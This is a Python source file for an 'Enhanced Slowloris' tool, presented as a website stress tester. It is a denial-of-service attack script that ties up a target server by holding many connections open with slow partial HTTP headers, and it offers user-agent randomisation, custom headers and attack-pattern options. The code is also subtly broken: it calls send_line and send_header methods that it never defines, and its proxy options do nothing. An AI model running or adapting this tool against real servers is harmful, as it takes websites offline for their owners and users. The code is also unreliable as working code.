#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import ssl
import sys
import time

def validate_port(value):
    port = int(value)
    if not (0 < port < 65536):
        raise argparse.ArgumentTypeError("Port must be in the range 1-65535")
    return port

def setup_logging(verbose):
    log_level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        format="[%(asctime)s] %(levelname)s: %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=log_level
    )

def parse_args():
    parser = argparse.ArgumentParser(
        description="Enhanced Slowloris - Low bandwidth stress test tool for websites"
    )
    parser.add_argument("host", nargs="?", help="Host to perform stress test on")
    parser.add_argument(
        "-p", "--port", default=80, help="Port of webserver, usually 80", type=validate_port
    )
    parser.add_argument(
        "-s",
        "--sockets",
        default=150,
        help="Number of sockets to use in the test",
        type=int,
    )
    parser.add_argument(
        "-v",
        "--verbose",
        dest="verbose",
        action="store_true",
        help="Increases logging",
    )
    parser.add_argument(
        "-ua",
        "--randuseragents",
        dest="randuseragent",
        action="store_true",
        help="Randomizes user-agents with each request",
    )
    parser.add_argument(
        "-x",
        "--useproxy",
        dest="useproxy",
        action="store_true",
        help="Use a SOCKS5 proxy for connecting",
    )
    parser.add_argument(
        "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
    )
    parser.add_argument(
        "--proxy-port", default="8080", help="SOCKS5 proxy port", type=validate_port
    )
    parser.add_argument(
        "--https",
        dest="https",
        action="store_true",
        help="Use HTTPS for the requests",
    )
    parser.add_argument(
        "--sleeptime",
        dest="sleeptime",
        default=15,
        type=int,
        help="Time to sleep between each header sent.",
    )
    parser.add_argument(
        "--method",
        dest="method",
        default="GET",
        help="HTTP method to use in the request",
    )
    parser.add_argument(
        "--headers",
        dest="headers",
        default="",
        help="Custom headers to include in the request, separated by commas",
    )
    parser.add_argument(
        "--attack-pattern",
        dest="attack_pattern",
        default="default",
        choices=["default", "random_path", "custom"],
        help="Choose the attack pattern",
    )

    args = parser.parse_args()

    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    if not args.host:
        parser.error("Host is required!")

    return args

def init_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)

    try:
        s.connect((ip, port))
    except socket.error as e:
        logging.error("Failed to connect to %s:%s - %s", ip, port, e)
        sys.exit(1)

    request_path = "/" if args.attack_pattern == "default" else generate_custom_path()
    
    s.send_line(f"{args.method} {request_path} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    if args.headers:
        custom_headers = args.headers.split(',')
        for header in custom_headers:
            header_name, header_value = header.split(':')
            s.send_header(header_name.strip(), header_value.strip())
    return s

def generate_custom_path():
    if args.attack_pattern == "random_path":
        return f"/{random.randint(0, 2000)}"
    elif args.attack_pattern == "custom":
        # Add your custom attack pattern logic here
        return "/custom_attack_path"
    else:
        return "/"

def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    # Try to send a header line to each socket
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    # Some of the sockets may have been closed due to errors or timeouts.
    # Re-create new sockets to replace them until we reach the desired number.

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host, args.port)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break

def main():
    global args, user_agents, list_of_sockets
    args = parse_args()
    setup_logging(args.verbose)

    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip, args.port)
        except socket.error as e:
            logging.error(e)
            sys.exit(1)
        list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)

if __name__ == "__main__":
    list_of_sockets = []
    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        # ... (other user agents)
    ]
    main()
